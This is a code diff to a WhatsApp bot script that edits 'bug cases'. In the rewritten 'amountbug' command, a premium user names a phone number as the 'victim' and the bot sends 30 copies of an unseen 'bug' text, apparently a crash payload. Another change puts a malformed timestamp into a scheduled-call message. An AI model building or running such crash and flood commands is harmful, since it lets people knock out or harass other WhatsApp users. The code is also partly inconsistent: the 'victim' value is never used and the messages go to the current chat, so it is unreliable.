@@ -2849,7 +2849,7 @@ break
         XeonBotInc.relayMessage(m.chat, {
             scheduledCallCreationMessage: {
                 callType: "VIDEO",
-                scheduledTimestampMs: 1200,
+                scheduledTimestampMs: `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
                 title: message
             }
         }, {})
@@ -3454,6 +3454,25 @@ Please @${m.mentionedJid[0].split`@`[0]} to type accept/reject`
                 }
             }
             break
+            case 'groupowner': {
+                XeonBotInc.sendMessage(m.chat,
+                { text: ` This Group was Created by @${groupOwner.split("@")[0]}👑`,
+                contextInfo:{
+                mentionedJid:[groupOwner],
+                forwardingScore: 9999999,
+                isForwarded: true, 
+                "externalAdReply": {
+                "showAdAttribution": true,
+                "containsAutoReply": true,
+                "title": ` ${global.botname}`,
+                "body": `${ownername}`,
+                "previewType": "PHOTO",
+                "thumbnailUrl": ``,
+                "thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
+                "sourceUrl": `${websitex}`}}},
+                { quoted: m})        
+                            }
+break
             case 'afk': {
                 let user = global.db.data.users[m.sender]
                 user.afkTime = + new Date
@@ -5460,7 +5479,6 @@ await XeonStickWait()
                     return('Error!')
                 })
                 }
-break
 case 'animeshinobu':{
 await XeonStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
@@ -8979,21 +8997,29 @@ break
 //⚠️do not edit cases otherwise bug not work
 //bug cases 
 case 'amountbug': {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return relygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
-amount = `${encodeURI(text)}`
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = `${xeontext1}`
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
+    if (!isPremium) return replygcxeon(mess.premium)
+    if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 919339619072`)
+    await loading()
+   victim = text.split("|")[0]+'@s.whatsapp.net'
+   amount = "30"
+   for (let i = 0; i < amount; i++) {
+   const xeonybug1 = `${xeontext1}`
+   XeonBotInc.sendMessage(m.chat,
+    { text: `${xeonybug1}`,
+    contextInfo:{
+    forwardingScore: 9999999,
+    isForwarded: true, 
+    "externalAdReply": {
+    "showAdAttribution": true,
+    "containsAutoReply": true,
+    "title": ` ${global.botname}`,
+    "body": `${ownername}`,
+    "previewType": "PHOTO",
+    "thumbnailUrl": ``,
+    "thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
+    "sourceUrl": `${websitex}`}}},
+    { quoted: m})   
+   }
 }
 replygcxeon(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
 break
